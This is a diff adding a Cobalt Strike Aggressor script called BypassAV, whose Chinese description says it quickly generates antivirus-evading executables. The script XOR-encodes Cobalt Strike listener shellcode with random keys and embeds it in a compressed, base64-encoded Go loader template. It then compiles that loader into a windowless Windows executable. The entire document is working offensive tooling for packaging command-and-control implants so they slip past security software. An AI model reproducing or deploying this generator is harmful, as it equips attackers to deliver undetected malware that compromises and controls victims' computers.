@@ -1,0 +1,68 @@
+popup attacks{
+	item("&BypassAV",{Generator();});
+}
+
+bind Ctrl+G{
+	Generator();
+}
+
+sub Generator{
+	$dialog = dialog("Generator", %(listener => "" , bit => false), &build);
+	drow_listener($dialog, "listener", "Listener: ");
+	dialog_description($dialog, "该插件用于快速生成免杀的可执行文件");
+	dbutton_action($dialog, "Generate");
+	dbutton_help($dialog, "http://github.com/hack2fun/BypassAV");
+	drow_checkbox($dialog, "bit", "x64: ", "使用64位的payload");
+	dialog_show($dialog);
+}
+
+sub build{
+	$a = $3["bit"] . "";
+
+	if ($3["bit"] eq "false"){
+		$system = "x86";
+		$arch = "386";
+	}else{
+		$system = "x64";
+		$arch = "amd64";
+	}
+
+	$code = gunzip(base64_decode("H4sIAAAAAAAACr1TUW/aMBB+xr/iFiHkrFGasu2lGw+IelVVsiJg3aaKRVliqFVjR05SgRj/fecEAmzt66wots/fd77v7pzFyVO84LCMhSKkvbm++8LG/SnbkvPzhb5ccMVNXHDIH7mUhIhlpk0BlLScfJ0nsZQOLkuVx3NuV4VY4uwSkmiVV7iQhdHgLgxvpnA8ehCsLoIgqAFjNmHje/Y3oFsBRv1rFrHvbPB1yhDZv/o2vpmyCvAej2/Zj+gC/hk9aG+qo20N6b4O6W5txM+xsfE+caO4fNfdQ3Yy/bDMi6GO06vhkDp7kJ9iAlzSUgUujvy+SKpAe8a9MEUZy76UOrGMxqOlfBYqHRmdUOcYZmnjQg50tg75Ups10mqfpxzEhPqZ1xgkobZ5qZKqxNSFDWm1N1U5E51yzI4V3uzhYfZrXXDSmmsDAi4xyx9x/gSSK7rSJmqQLtrPzqy71oHdgzjLuEppY/LghPUgZj+rslT/LkrCCOI0NR5EHnBj7JXHqv0BJpIGHpRCFVlhqA3kEITrwaHDfh/1kgcv9w3eKObVRW8wfUJCp2N3PjNGG0wPWp3pIwed2cYXWkGil5nkBU8hL5OE5/m8lHLtO7X0XaXZShQ0qOVEjZYenBSs1lKrpTs9Lq1fjz/SaOCGdg65CmZW3yvC/4MQ+5r9ieQ8ox/gLdRbjk87xfM9YVLPO1lB87lk+weKv0dCXQQAAA=="));
+	$KEY_1 = rand(255);
+	$KEY_2 = rand(255);
+	$code = replace($code, '\$\{KEY_1\}', $KEY_1);
+	$code = replace($code, '\$\{KEY_2\}', $KEY_2);
+	$shell_code = shellcode($3["listener"], false, $system);
+	$shell_code = split("",$shell_code);
+	$arr = "";
+
+	for ($i = 0; $i < size($shell_code); $i++){
+		$arr = $arr . "," .asc($shell_code[$i]) ^ $KEY_1 ^ $KEY_2;
+	}
+
+	$final_shellcode = "xor_shellcode :=[]byte" . "{" . substr($arr,1,strlen($arr)) . "}";
+	$code = replace($code , '\$\{shellcode\}' , $final_shellcode);
+
+	prompt_file_save("BypassAV.exe", {
+		$path = "$1";
+
+		if ("*Windows*" iswm systemProperties()["os.name"]) {
+			$path = replace($path, "\\\\", "\\\\\\\\");
+			$build = "//go:generate -command shell cmd /c set GOOS=windows&& set GOARCH= $+ $arch $+ && go build -o $path -ldflags -H=windowsgui C:\\\\windows\\\\temp\\\\temp.go && del C:\\\\windows\\\\temp\\\\temp.go";
+			$gofile = "C:\\\\windows\\\\temp\\\\temp.go";
+			$handle = openf("> $+ $gofile");
+		}else{
+			$build = "//go:generate -command shell bash -c \"GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go\"";
+			$gofile = "/tmp/temp.go";
+			$handle = openf("> $+ $gofile");
+		}
+
+		$code = replace($code, '\$\{GONERATE\}', $build);
+		writeb($handle, $code);
+		closef($handle);
+		$space = " ";
+		exec("go generate $+ $space $+ $gofile");
+		show_message("save to  $+ $1");
+    });
+
+}
